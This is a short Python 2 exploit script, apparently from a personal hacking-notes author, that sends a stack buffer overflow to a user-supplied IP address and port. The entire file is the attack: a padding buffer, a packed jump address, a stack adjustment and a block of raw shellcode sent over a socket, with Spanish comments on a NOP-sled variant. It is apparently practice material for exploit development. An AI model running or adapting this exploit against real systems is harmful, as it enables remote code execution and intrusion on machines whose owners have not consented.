#!/usr/bin/python
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

import socket, sys
from struct import pack

if len(sys.argv) < 3:
	print ("\n Usage: python " + sys.argv[0] + " <ip address> <port>\n")
	sys.exit(0)


ipADD = sys.argv[1]
rPort = sys.argv[2]

shellcode = (
"\xd9\xcb\xd9\x74\x24\xf4\xbb\x15\xa5\x0e\xc7\x5a\x31\xc9\xb1"
"\x12\x31\x5a\x17\x03\x5a\x17\x83\xff\x59\xec\x32\xce\x7a\x06"
"\x5f\x63\x3e\xba\xca\x81\x49\xdd\xbb\xe3\x84\x9e\x2f\xb2\xa6"
"\xa0\x82\xc4\x8e\xa7\xe5\xac\x1a\x51\x48\x30\x73\x63\x74\x49"
"\x38\xea\x95\xf9\x58\xbd\x04\xaa\x17\x3e\x2e\xad\x95\xc1\x62"
"\x45\x48\xed\xf1\xfd\xfc\xde\xda\x9f\x95\xa9\xc6\x0d\x35\x23"
"\xe9\x01\xb2\xfe\x6a"
)

if __name__=='__main__':
	#Este es con nops buffer = "A"*2606 + pack("<L", 0x5f4a358f) + "\x90"*16 + shellcode
	#Este es retrocediendo la PILA
	#pack es donde va la dierccion del salto al ESP
	buffer = "A"*524 + pack("<L", 0x311712F3) + "\x83\xEC\x10" + shellcode
	try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ipADD, int(rPort)))
                miData = buffer + '\r\n'
                s.send(miData)
                data = s.recv(1024)
	except:
		print "\n [!] Error...\n"
		sys.exit(1)
